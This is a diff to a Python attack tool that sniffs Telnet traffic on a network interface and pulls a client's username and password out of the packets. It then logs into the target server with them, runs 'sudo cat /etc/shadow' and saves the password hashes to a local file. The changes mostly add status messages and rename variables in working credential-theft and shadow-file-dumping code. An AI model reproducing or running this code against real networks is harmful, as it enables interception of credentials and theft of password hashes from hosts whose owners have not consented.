@@ -38,6 +38,7 @@ def get_telnet_credentials(pkt):
     elif payload == "b'\\r\\x00'":
         counter = counter + 1
         if counter == 3:
+            print("credentials found in Telnet packets")
             use_telnet_credentials(user_login, user_password)
         else:
             return
@@ -56,21 +57,17 @@ def use_telnet_credentials(login, password):
     for j in password:
         str_password = str_password + j
 
-    print("user user_login: " + str_login + "| user user_password: " + str_password)
+    print("user login: " + str_login + "| user password: " + str_password)
 
     try:
-        tn = telnetlib.Telnet(target2_ip)
-        tn.read_until(b"user_login: ", 2)
+        print("connecting to the host " + target2_ip + " ...")
+        tn = telnetlib.Telnet(target2_ip, 23, 2)
+        tn.read_until(b"login: ", 2)
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
-
-    except Exception as e:
-        print("an error occured: " + str(e))
-        print("telnet connection with remote server couldn't be established")
-        sys.exit(1)
-
-    try:
+        
+        print("trying to read shadow file content...")
         tn.write(b"sudo cat /etc/shadow\n")
         tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
@@ -78,28 +75,28 @@ def use_telnet_credentials(login, password):
         read_data = tn.read_all()
         with open('output_data.txt', 'w') as output:
             output.write(str(read_data))
-        print("[*] Ending Telnet Session: Check output_data.txt For Shadow File Content")
+        print("[*] Ending Telnet Session: check output_data.txt for shadow file content")
         sys.exit(1)
-
+        
     except Exception as e:
         print("an error occured: " + str(e))
-        print("account not in sudoers list: shadow file unaccessible")
         sys.exit(1)
 
 
 def run():
     global target2_ip
     try:
-        target = raw_input("Enter Desired Interface [eth0]: ")
-        if target == "":
-            target = "eth0"
+        interface = raw_input("Enter Desired Interface [eth0]: ")
+        if interface == "":
+            interface = "eth0"
         target1_ip = raw_input("[*] Enter Client IP: ")
         target2_ip = raw_input("[*] Enter Server IP: ")
     except KeyboardInterrupt:
         print("\n[*] User Requested Shutdown")
         print("[*] Exiting...")
         sys.exit(1)
-
+    
+    print("Analysing packets...")
     client_mac = get_mac(target1_ip)
-    sniff(iface=target, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
+    sniff(iface=interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
           count=0)
